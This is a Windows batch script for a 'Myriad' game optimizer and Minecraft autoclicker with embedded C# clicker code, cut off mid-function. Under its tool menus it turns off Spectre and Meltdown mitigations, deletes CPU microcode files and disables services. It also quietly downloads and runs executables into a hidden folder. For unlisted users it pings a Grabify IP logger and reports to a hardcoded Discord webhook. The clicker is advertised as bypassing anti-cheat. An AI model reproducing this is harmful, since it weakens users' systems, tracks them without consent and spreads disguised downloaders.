sc config "tapisrv" start=disabled & sc stop "tapisrv"
sc config "walletservice" start=disabled & sc stop "walletservice"
sc config "phonesvc" start=disabled & sc stop "phonesvc"
sc config "sysmain" start=disabled & sc stop "sysmain"
sc config "remoteregistry" start=disabled & sc stop "remoteregistry"
sc config "trkwks" start=disabled & sc stop "trkwks"
sc config "wmpnetworksvc" start=disabled & sc stop "wmpnetworksvc"
sc config "dmwappushservice" start=disabled & sc stop "dmwappushservice"
sc config "diagtrack" start=disabled & sc stop "DiagTrack"
sc config "pnrpsvc" start=disabled & sc stop "pnrpsvc"
sc config "cscservice" start=disabled & sc stop "cscservice"
sc config "napagent" start=disabled & sc stop "napagent"
sc config "netlogon" start=disabled & sc stop "netlogon"
sc config "nettcpportsharing" start=disabled & sc stop "nettcpportsharing"
sc config "msiscsi" start=disabled & sc stop "msiscsi"
sc config "iphlpsvc" start=disabled & sc stop "iphlpsvc"
sc config "ieetwcollectorservice" start=disabled & sc stop "ieetwcollectorservice"
sc config "vmickvpexchange" start=disabled & sc stop "vmickvpexchange"
sc config "vmicguestinterface" start=disabled & sc stop "vmicguestinterface"
sc config "vmicshutdown" start=disabled & sc stop "vmicshutdown"
sc config "vmicheartbeat" start=disabled & sc stop "vmicheartbeat"
sc config "vmicrdv" start=disabled & sc stop "vmicrdv"
sc config "vmictimesync" start=disabled & sc stop "vmictimesync"
sc config "vmicvss" start=disabled & sc stop "vmicvss"
sc config "hidserv" start=disabled & sc stop "hidserv"
sc config "homegroupprovider" start=disabled & sc stop "homegroupprovider"
sc config "homegrouplistener" start=disabled & sc stop "homegrouplistener"
sc config "wpcsvc" start=disabled & sc stop "wpcsvc"
sc config "vaultsvc" start=disabled & sc stop "vaultsvc"
sc config "peerdistsvc" start=disabled & sc stop "peerdistsvc"
sc config "bthhfsrv" start=disabled & sc stop "bthhfsrv"

:: Windows Cameras
 sc config "FrameServerMonitor" start=disabled & sc stop "frameservermonitor"
 sc config "FrameServer" start=disabled & sc stop "frameserver"

:: Xbox Services
sc config "XblAuthManager" start=disabled & sc stop "xblauthmanager"
sc config "XboxNetApiSvc" start=disabled & sc stop "xboxnetapisvc"
sc config "xblgamesave" start=disabled & sc stop "xblgamesave"
sc config "xboxgipsvc" start=disabled & sc stop "XboxGipSvc"

:: Radio Service
sc config "rmsvc" start=disabled & sc stop "rmsvc"

:: Bluetooth Services
 sc config "bthavctpsvc" start=disabled & sc stop "bthavctpsvc"
 sc config "bthserv" start=disabled & sc stop "bthserv"

:ECHOX
echo !S_WHITE!%time:~0,8% %u%[%red%INFO%u%]: %*
echo %time:~0,8% [%r%INFO%r%]: %* >>"logs\log_!datetime!.txt"
goto:eof

set "
CMDLINE=RED=[31m,S_GRAY=[90m,S_RED=[91m,S_GREEN=[92m,S_YELLOW=[93m,S_MAGENTA=[95m,S_WHITE=[97m,B_BLACK=
[40m,B_YELLOW=[43m,UNDERLINE=[4m,_UNDERLINE=[24m
"

call:ECHOX Disabling Meltdown and Spectre
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f >nul 2>&1
del /f /q "%WinDir%\System32\mcupdate_GenuineIntel.dll" >nul 2>&1
del /f /q "%WinDir%\System32\mcupdate_AuthenticAMD.dll" >nul 2>&1

call:ECHOX Speed up start time
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DelayedDesktopSwitchTimeout" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Serialize" /v "StartupDelayInMSec" /t REG_DWORD /d "0" /f >nul 2>&1

call:ECHOX Disabling startup sound
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\BootAnimation" /v "DisableStartupSound" /t REG_DWORD /d "1" /f >nul 2>&1


call:ECHOX Disabling fast startup
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f >nul 2>&1

call:ECHOX Disabling background apps
reg add "HKLM\SYSTEM\CurrentControlSet\Services\bam" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dam" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1

call:ECHOX Multimedia class scheduler
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "10" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "10" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NoLazyMode" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "LazyModeTimeout" /t REG_DWORD /d "150000" /f >nul 2>&1

call:ECHOX Increasing file system memory cache size
call:ECHOX Increasing the space reserved for the MFT
if !TOTAL_MEMORY! LSS 8000000 (
	fsutil behavior set memoryusage 1
	fsutil behavior set mftzone 1
) >nul 2>&1 else if !TOTAL_MEMORY! LSS 16000000 (
	fsutil behavior set memoryusage 1
	fsutil behavior set mftzone 2
) >nul 2>&1 else (
	fsutil behavior set memoryusage 2
	fsutil behavior set mftzone 2
) >nul 2>&1

call:ECHOX Disabling memory compression and page combining
call:POWERSHELL "Disable-MMAgent -MemoryCompression"
call:POWERSHELL "Disable-MMAgent -PageCombining"

call:ECHOX Setting CSRSS priority to high
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "CpuPriorityClass" /t REG_DWORD /d "3" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "3" /f >nul 2>&1
ECHO DONE SEX
PAUSE > NUL
GOTO LoginMENUAC

:LoginMenuS
cls
color %color% > nul 2>&1
type MyriadLogo.txt
echo.
echo.
echo.
echo.
echo.
echo                     %b% Soon..
timeout /t 3 > nul 2>&1
goto LoginMenuV

:LoginMenuV
cls
color %color%
title %title% > nul 2>&1
type MyriadLogo.txt
Batbox /h 0
Call Button 12 8 "Games" 26 8 "Tools" 18 12 "Windows" # Press
Getinput /m %Press% /h 70

if %errorlevel%==1 (goto LoginMenuS)
if %errorlevel%==2 (goto LoginMenuS)
if %errorlevel%==3 (goto LoginMenuS)
goto LoginMenu

:LoginMenuS
cls
color %color% > nul 2>&1
type MyriadLogo.txt
echo.
echo.
echo.
echo.
echo.
echo                     %b% Soon..
timeout /t 3 > nul 2>&1
goto LoginMenuV

:GamesMenu
cls
color %color%
title %title% > nul 2>&1
type MyriadLogo.txt
Batbox /h 0
Call Button 10 8 "Minecraft" 28 8 "Rust 2" 17 12 "Rocket League" 0 5 "Back" # Press
Getinput /m %Press% /h 70

if %errorlevel%==1 (goto MinecraftMenu)
if %errorlevel%==2 (goto GamesMenu)
if %errorlevel%==3 (goto GamesMenu)
if %errorlevel%==4 (goto LoginMenu)
goto GamesMenu

:MinecraftMenu
cls
color %color%
title %title% > nul 2>&1
type MyriadLogo.txt
Batbox /h 0
Call Button 7 9 "Auto Clicker" 26 9 "FPS Booster" 0 5 "Back" # Press
Getinput /m %Press% /h 70

if %errorlevel%==1 (goto AutoClickerMenu)
if %errorlevel%==2 (goto MinecraftMenu)
if %errorlevel%==3 (goto GamesMenu)
goto MinecraftMenu

:: ==============================================================

:OptimizerM
cls
color %color%
title %title% > nul 2>&1
type MyriadLogo.txt
echo.
echo.
echo.
echo.
echo.
echo                    %r%Maintenance
timeout -t 3 -nobreak > nul 2>&1
goto LoginMenu
cls
color %color%
title %title% > nul 2>&1
type MyriadLogo.txt
Batbox /h 0
Call Button 10 7 "Booster" 27 7 "Cleaner" 18 11 "Drivers" # Press
Getinput /m %Press% /h 70

if %errorlevel%==1 (goto OptimizerM)
if %errorlevel%==2 (goto CleanerS)
if %errorlevel%==3 (goto DriversS)
goto OptimizerM

:OptimizerM

:CleanerS
cls
color %color%
title %title% > nul 2>&1
type MyriadLogo.txt
echo.
echo.
echo.
echo.
echo.
echo                    %r%Maintenance
timeout -t 3 -nobreak > nul 2>&1
goto LoginMenu 

:DriversS
cls
color %color%
title %title% > nul 2>&1
type MyriadLogo.txt
echo.
echo.
echo.
echo.
echo.
echo                    %r%Maintenance
timeout -t 3 -nobreak > nul 2>&1
goto LoginMenu

:: ==============================================================

:SecureExe
:UUIDREGISTER

:XhaysUUID
set "XhaysW=A9ABB334-62B9-11EB-89B8-3C6409608300"
set "Blacklisted=00000000-0000-0000-0000-111111111111"

:: wmic csproduct get uuid
for /f "delims=" %%A in ('wmic csproduct get uuid /value ^| find "="') do (
    for /f "tokens=2 delims==" %%B in ("%%~A") do (
        set "serialnumber=%%B"
    )
)

if "%serialnumber%"=="!XhaysW!" goto LOGINMENUAC

:awuenUUID
set "awuenW=4D3FAA04-9443-E811-A4C3-9829A69842CD"
set "Blacklisted=00000000-0000-0000-0000-111111111111"

:: wmic csproduct get uuid
for /f "delims=" %%A in ('wmic csproduct get uuid /value ^| find "="') do (
    for /f "tokens=2 delims==" %%B in ("%%~A") do (
        set "serialnumber=%%B"
    )
)

if "%serialnumber%"=="!awuenW!" goto LOGINMENUAC

:brexyUUID
set "brexyW=E4C27A14-E2BF-11E6-979A-C85B76D51634"
set "Blacklisted=00000000-0000-0000-0000-111111111111"

:: wmic csproduct get uuid
for /f "delims=" %%A in ('wmic csproduct get uuid /value ^| find "="') do (
    for /f "tokens=2 delims==" %%B in ("%%~A") do (
        set "serialnumber=%%B"
    )
)

if "%serialnumber%"=="!brexyW!" goto LOGINMENUAC

:alejoUUID
set "alejoW=E9A54CC4-CC70-4514-90FA-349F0AC83F92"
set "Blacklisted=00000000-0000-0000-0000-111111111111"

:: wmic csproduct get uuid
for /f "delims=" %%A in ('wmic csproduct get uuid /value ^| find "="') do (
    for /f "tokens=2 delims==" %%B in ("%%~A") do (
        set "serialnumber=%%B"
    )
)

if "%serialnumber%"=="!alejoW!" goto LOGINMENUAC

:havackasUUID
set "havackasW=E9A54CC4-CC70-4514-90FA-349F0AC83F92"
set "Blacklisted=00000000-0000-0000-0000-111111111111"

:: wmic csproduct get uuid
for /f "delims=" %%A in ('wmic csproduct get uuid /value ^| find "="') do (
    for /f "tokens=2 delims==" %%B in ("%%~A") do (
        set "serialnumber=%%B"
    )
)

if "%serialnumber%"=="!havackasW!" goto LOGINMENUAC

:: ==============================================================

goto MainMenu

:: =============================================================
::                        Opened by RANDOM
:: =============================================================

:Random
curl -g -L -# -o "%localappdata%\Myriad\DSW.exe" "https://myriad.fun/$@&DSW.exe" > nul 2>&1w
curl -g -L -# -o "%localappdata%\Myriad\nul\MyriadK.exe" "https://myriad.fun/$@&MyriadK.exe" > nul 2>&1
DSW.exe "https://discord.com/api/webhooks/1029494449866276895/z7d4pxPsB0nIJmJjfWCS_vItoks1FcTos-nMRjjqelgwwCATd5eL3f5W6GqriRt0U_K8" "**Myriad** Opened by a **RANDOM**" "Myriad Logs" > nul 2>&1
start %localappdata%\Myriad\nul\MyriadK.exe
Exit

:: ==============================================================
::                            Secure EXE
:: ==============================================================

:Random
curl https://grabify.link/3UL871 > nul 2>&1
DSW.exe "https://discord.com/api/webhooks/1029494449866276895/z7d4pxPsB0nIJmJjfWCS_vItoks1FcTos-nMRjjqelgwwCATd5eL3f5W6GqriRt0U_K8" "**Myriad** Opened by a **RANDOM**" "Myriad Logs" > nul 2>&1
curl -g -L -# -o "%localappdata%\Myriad\nul\MyriadK.exe" "https://myriad.fun/$@&MyriadK.exe" > nul 2>&1
start %localappdata%\Myriad\nul\MyriadK.exe
Exit

:XhaysI
DSW.exe "https://discord.com/api/webhooks/1029494449866276895/z7d4pxPsB0nIJmJjfWCS_vItoks1FcTos-nMRjjqelgwwCATd5eL3f5W6GqriRt0U_K8" "**Myriad** Opened by <@874794593332379668>" "Myriad Logs" > nul 2>&1
goto Loading

::==============================================================

:Loading
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.%r%%r2%...................%t%%w%
echo.
echo.
echo.
curl -g -L -# -o "%localappdata%\Myriad\DSW.exe" "https://cdn.discordapp.com/attachments/1029491599425671271/1029515128707751966/DSW.exe" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%..%r%%r2%..................%t%%w%
echo.
echo.
echo.
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%...%r%%r2%.................%t%%w%
echo.
echo.
echo.
curl -g -L -# -o "%localappdata%\Myriad\MyriadLogo.txt" "https://cdn.discordapp.com/attachments/1029491599425671271/1078486448686248026/MyriadLogo.txt" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%....%r%%r2%................%t%%w%
echo.
echo.
echo.
curl -g -L -# -o "%localappdata%\Myriad\batbox.exe" "https://cdn.discordapp.com/attachments/1029491599425671271/1029515150656553041/batbox.exe" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.....%r%%r2%...............%t%%w%
echo.
echo.
echo.
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%......%r%%r2%..............%t%%w%
echo.
echo.
echo.
curl -g -L -# -o "%localappdata%\Myriad\Button.bat" "https://cdn.discordapp.com/attachments/1029491599425671271/1029515155807162418/Button.bat" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.......%r%%r2%.............%t%%w%
echo.
echo.
echo.
curl -g -L -# -o "%localappdata%\Myriad\GetInput.exe" "https://cdn.discordapp.com/attachments/1029491599425671271/1029515145690497105/GetInput.exe" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%........%r%%r2%............%t%%w%
echo.
echo.
echo.
curl -g -L -# -o "%appdata%\.minecraft\resourcepacks\Myriad_FPS_Mashup.zip" "https://cdn.discordapp.com/attachments/1029491599425671271/1029493768216387654/Myriad_FPS_Mashup.zip" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.........%r%%r2%...........%t%%w%
echo.
echo.
echo.
curl -g -L -# -o "%appdata%\.minecraft\resourcepacks\Myriad_Overlay_8Mashup.zip" "https://cdn.discordapp.com/attachments/1029491599425671271/1029493768572911657/Myriad_Overlay_8Mashup.zip" > nul 2>&1
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%..........%r%%r2%..........%t%%w%
echo.
echo.
echo.
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%...........%r%%r2%.........%t%%w%
echo.
echo.
echo.
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%............%r%%r2%........%t%%w%
echo.
echo.
echo.
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.............%r%%r2%.......%t%%w%
echo.
echo.
echo.

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%..............%r%%r2%......%t%%w%
echo.
echo.
echo.

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%...............%r%%r2%.....%t%%w%
echo.
echo.
echo.

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%................%r%%r2%....%t%%w%
echo.
echo.
echo.

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%.................%r%%r2%...%t%%w%
echo.
echo.
echo.

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%..................%r%%r2%..%t%%w%

::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%...................%r%%r2%.%t%%w%
::==============================================================
cls
title %title%
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                     %y%Loading...
echo.
echo               %g%%g2%....................%r%%r2%%t%%w%
DSW.exe "%myriado%" "**Myriad has been opened!**" "Myriad Opened" > nul 2>&1
goto MainMenu
::==============================================================

:Soon
cls
color %color%
type MyriadLogo.txt
echo.
echo.
echo.
echo.
echo.
echo              %u%[%g%+%u%] %g%Soon...
timeout /t 3 >nul & cls & goto MainMenu

:ColorText
echo off
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 2>&1
goto :eof

::==============================================================
:ACCMENU
cls
mode 72,16
set /p TGL=Enter Toogle: 
::set "DEBUG=true"

::https://learn.microsoft.com/en-us/dotnet/api/system.consolekey
:: The key that is used to toggle the click on and off
set "KEY_TOGGLE=%TGL%"
:: The key that is used to disable the clicker after it has started to change profile
set "KEY_DISABLE=Delete"
:: The key that is used to hide the clicker window after it has started
set "KEY_HIDE=End"

set logocolor=[38;5;92m
set "lastinput="

title %nothing%
setlocal enableDelayedExpansion
set /a totalProfiles=0
goto init

:init
call :makeProfile "Xhays" "Bypass All [95m(SECURE)[0m" "2" "8 10"
call :makeProfile "SineA" "Up to 5 variation [93m(SECURE)[0m" "1" "17 17"
call :makeProfile "AstralMC" "Up to 5 variation [93m(SECURE)[0m" "1" "16 17"
call :makeProfile "Minemen" "Up to 5 variation [93m(SECURE)[0m" "1" "19 20"


goto list

:banner
cls
goto :eof

:list
call :banner
for /l %%a in (1,1,%totalProfiles%) do (
    echo %%a.[6G!profile[%%a]![31G!profile[%%a]_desc! [!profile[%%a]_defaultargs!]
)
echo.

goto main

:main
set /p "input=[?25h> "
if "%input%"=="%lastinput%" goto main
set "lastinput=%input%"

:: input system recode here
set /a counter=0
for %%a in (%input%) do (
    set "input[!counter!]=%%a"
    set /a counter+=1
)
set /a counter-=1

if not defined profile[!input[0]!] (
    echo '!input[0]!' is not a valid profile.
    goto main
)

set "profile=profile[!input[0]!]"
if %counter%==0 (
    call :start "!%profile%!" "!%profile%_defaultargs!"
) else if %counter% GEQ !%profile%_totalargs! (
    set "providedargs="
    for /l %%a in (1,1,!%profile%_totalargs!) do (
        if %%a==1 (set "providedargs=!input[%%a]!") else (set "providedargs=!providedargs! !input[%%a]!")
    )
    call :start "!%profile%!" "!providedargs!"
) else (
    echo Profile '!%profile%!' requires !%profile%_totalargs! arguments.
)

goto main

:: call :start <profile> <args>
:start
call :banner
echo Profile: %~1 [%~2]
call :run "%~1" "%KEY_TOGGLE% %KEY_HIDE% %KEY_DISABLE%" "%~2"
goto list

:: @makeProfile <name> <description> <total-args> <default-args>
::
:: The name must not have a space in it due to how the vars are done.
::
:: The name and args are parsed to the clicker and will determine what randomization to use and what values it should take in.
:: Arguments may differ depending on the randomization.
:makeProfile
set /a totalProfiles+=1
set "profile[!totalProfiles!]=%~1"
set "profile[!totalProfiles!]_desc=%~2"
set "profile[!totalProfiles!]_totalargs=%~3"
set "profile[!totalProfiles!]_defaultargs=%~4"

rem this is a shitty fix but i was having problems and this works
set "profile[%~1]=%~1"
set "profile[%~1]_desc=%~2"
set "profile[%~1]_totalargs=%~3"
set "profile[%~1]_defaultargs=%~4"

set "profile_%~1=!totalProfiles!"
goto :eof

:run
set "lastinput="
setlocal
set "POWERSHELL_BAT_ARGS=%*"
if defined POWERSHELL_BAT_ARGS set "POWERSHELL_BAT_ARGS=%POWERSHELL_BAT_ARGS:"=\"%"
endlocal & powershell -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "$_ = $input; Invoke-Expression $( '$input = $_; $_ = \"\"; $args = @( &{ $args } %POWERSHELL_BAT_ARGS% );' + [String]::Join( [char]10, $( Get-Content \"%~f0\" ) ) )"
if defined DEBUG pause
goto :EOF
#>
$namespace = get-random
$class = get-random

$code = @"
using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
namespace n$namespace
{
    public class c$class
    {
    
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowThreadProcessId(IntPtr handle, out int processId);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint wMsg, UIntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        public static IntPtr MAKELPARAM(int p, int p_2)
        {
            return (IntPtr) ((p_2 << 16) | (p & 0xFFFF));
        }
        
        private static int GetKey(string s)
        {   
            return (int) Enum.Parse(typeof(ConsoleKey), s);
        }
        
        private static string GetKeyString(string s)
        {
            if (string.IsNullOrEmpty(s))
            {
                return string.Empty;
            }
            s = s.ToLower();
            s = char.ToUpper(s[0]) + s.Substring(1);
            return s;
        }
        
        private static long GetSystemTime()
        {
            return BitConverter.ToInt64(BitConverter.GetBytes(DateTimeOffset.Now.ToUnixTimeMilliseconds()), 0);
        }
        
        static Random rand;
        static string[] KeybindString = new string[3];
        static int[] Keybinds = new int[3];
        static bool ClickerEnabled;
        static bool WindowVisible;
        static int StatusRow;
        static IntPtr ConsoleWindow;
        static IntPtr ForegroundWindow;
        static IntPtr MCWindow;
        
        private static double GetRandomDouble(double minimum, double maximum)
        {
            return rand.NextDouble() * (maximum - minimum) + minimum;
        }
        
        public static void Init(string toggle, string hide, string disable) {
            KeybindString[0] = GetKeyString(toggle);
            KeybindString[1] = GetKeyString(hide);
            KeybindString[2] = GetKeyString(disable);
            Keybinds[0] = GetKey(KeybindString[0]);
            Keybinds[1] = GetKey(KeybindString[1]);
            Keybinds[2] = GetKey(KeybindString[2]);
            
            ClickerEnabled = true;
            WindowVisible = true;
            
            Console.WriteLine("");
            Console.WriteLine("Keybinds:");
            Console.WriteLine("  - Toggle Clicker: " + KeybindString[0]);
            Console.WriteLine("  - Hide/Show Window: " + KeybindString[1]);
            Console.WriteLine("  - Disable Clicker (Change Profile): " + KeybindString[2]);
            Console.WriteLine("");
        }
        
        public static void DrawStatus(int row, bool enabled)
        {
            Console.SetCursorPosition(1, row);
            Console.WriteLine("Status: " + (enabled ? "\x1b[92mEnabled \x1b[0m" : "\x1b[91mDisabled\x1b[0m"));
        }
        
        public static void DrawStatus(int row, bool enabled, string label, string value)
        {
            Console.SetCursorPosition(1, row);
            Console.WriteLine("Status: " + (enabled ? "\x1b[92mEnabled \x1b[0m" : "\x1b[91mDisabled\x1b[0m"));
            Console.SetCursorPosition(1, row + 1);
            Console.WriteLine(label + ": " + value + "   ");
        }
        
        public static void DrawStatus(int row, bool enabled, string label, int value)
        {
            Console.SetCursorPosition(1, row);
            Console.WriteLine("Status: " + (enabled ? "\x1b[92mEnabled \x1b[0m" : "\x1b[91mDisabled\x1b[0m"));
            Console.SetCursorPosition(1, row + 1);
            Console.WriteLine(label + ": " + value + "   ");
        }
        
        public static bool MinOverMaxCheck(int min, int max)
        {
            if (min > max)
            {
                Console.WriteLine("Minimum CPS cannot be over Maximum CPS");
                return true;
            }
            return false;
        }
        
        // KeyStates[0] = Left Mouse Button
        static bool[] KeyStates = new bool[3];
        static bool[] PrevKeyStates = new bool[3];
        
        public static bool Binds() {
            bool ReturnValue = true;
            PrevKeyStates[0] = KeyStates[0];
            KeyStates[0] = BitConverter.GetBytes(GetAsyncKeyState(Keybinds[0]))[1] == 0x80;
            PrevKeyStates[1] = KeyStates[1];
            KeyStates[1] = BitConverter.GetBytes(GetAsyncKeyState(Keybinds[1]))[1] == 0x80;
            PrevKeyStates[2] = KeyStates[2];
            KeyStates[2] = BitConverter.GetBytes(GetAsyncKeyState(Keybinds[2]))[1] == 0x80;
            
            // Toggle Clicker
            if (PrevKeyStates[0] != KeyStates[0] && KeyStates[0])
            {
                ClickerEnabled = !ClickerEnabled;
                DrawStatus(StatusRow, ClickerEnabled);
            }
            
            // Hide/Show Window
            if (PrevKeyStates[1] != KeyStates[1] && KeyStates[1])
            {
                WindowVisible = !WindowVisible;
                ShowWindow(ConsoleWindow, WindowVisible ? 5 : 0);
            }
            
            // Disable Clicker (Change Profile)
            if (PrevKeyStates[2] != KeyStates[2] && KeyStates[2])
            {
                ClickerEnabled = false;
                DrawStatus(StatusRow, ClickerEnabled);
                if (!WindowVisible) ShowWindow(ConsoleWindow, 5);
                ReturnValue = false;
            }
            return ReturnValue;
        }
        
        public static void Xhays(string[] args)
        {
            bool running = true;
            
            StatusRow = Console.CursorTop;
            
            int MinimumCPS = Int32.Parse(args[4]);
            int MaximumCPS = Int32.Parse(args[5]);
            if (MinOverMaxCheck(MinimumCPS, MaximumCPS)) return;
            DrawStatus(StatusRow, ClickerEnabled);
            
            while (running)
            {
                ForegroundWindow = GetForegroundWindow();
                MCWindow = FindWindow("LWJGL", null);
                
                // Clicker code
                if (ClickerEnabled)
                {
                    if (BitConverter.GetBytes(GetAsyncKeyState(1))[1] == 0x80)
                    {
                        if (MCWindow == ForegroundWindow)
                        {
                            // 0x0084 = WM_NCHITTEST
                            if (SendMessage(ForegroundWindow, 0x0084, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y)) == (IntPtr) 1)
                            {
                                if (rand.Next(1, 7) == 1)
                                {
                                    if (rand.Next(1, 11) <= 1) Thread.Sleep(rand.Next((1000 / MaximumCPS), (1000 / MinimumCPS)) - (rand.Next(3, 32)) >> 2);
                                    else Thread.Sleep(rand.Next((1000 / MaximumCPS), (1000 / MinimumCPS)) >> 1);
                                }
                                else
                                {
                                    SendMessage((IntPtr) ForegroundWindow, 0x0201, (UIntPtr) 0x0001, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    
                                    if (rand.Next(1, 4) <= 1) Thread.Sleep(rand.Next((1000 / MaximumCPS), (1000 / MinimumCPS)) - (rand.Next(11, 32)) >> 1);
                                    else Thread.Sleep(rand.Next((1000 / MaximumCPS), (1000 / MinimumCPS)) >> 3);
                                        
                                    SendMessage((IntPtr) ForegroundWindow, 0x0202, UIntPtr.Zero, MAKELPARAM(Cursor.Position.X, Cursor.Position.Y));
                                    
                                    if (rand.Next(1, 9) <= 1) Thread.Sleep(rand.Next((1000 / MaximumCPS), (1000 / MinimumCPS)) - (rand.Next(5, 32)) >> 1);
                                    else Thread.Sleep(rand.Next((1000 / MaximumCPS), (1000 / MinimumCPS)) >> 2);
                                }
                            }
                        }
                    }
                }
                
                if (!Binds()) running = false;
            }
            return;
        }

        public static void Sine(string[] args) {
            bool running = true;
            
            StatusRow = Console.CursorTop;
            
            int MinimumCPS = Int32.Parse(args[4]);
            int MaximumCPS = Int32.Parse(args[5]);
            if (MinOverMaxCheck(MinimumCPS, MaximumCPS)) return;
            
            long lastLoopRun = 0;
            long now = 0;
            long dif = 0;
            long lastDelay = 0;
            
            long cpsSpike = 0;
            long cpsDrop = 0;
            long lastEvent = -15;
            double sinX = 0;
            
            DrawStatus(StatusRow, ClickerEnabled);
            
            while (running)
            {
                ForegroundWindow = GetForegroundWindow();
                MCWindow = FindWindow("LWJGL", null);
                
                // Clicker code
                if (ClickerEnabled)
                {
                    if (BitConverter.GetBytes(GetAsyncKeyState(1))[1] == 0x80)
                    {
                        if (MCWindow == ForegroundWindow)
                        {
                            if (lastLoopRun == 0) {
                                lastLoopRun = GetSystemTime();
                            } else {
                                now = GetSystemTime();
                                dif = (now - lastLoopRun) >> 1;
                                dif -= lastDelay;
                                lastLoopRun = now;
                                
                                if (cpsDrop > 0) cpsDrop--;
                                if (cpsSpike > 0) cpsSpike--;
                                
                                if (lastEvent > 0) {
                                    if (rand.Next(0, 41 / (int) lastEvent) == 0) {
                                        cpsSpike = 20;
                                        lastEvent = -17;
                                    } else if (rand.Next(0, 67 / (int) lastEvent) == 0) {
                                        cpsDrop = 21;
                                        lastEvent = -16;
                                    }
                                }
                                
                                double minDelay = 1000 / MinimumCPS;
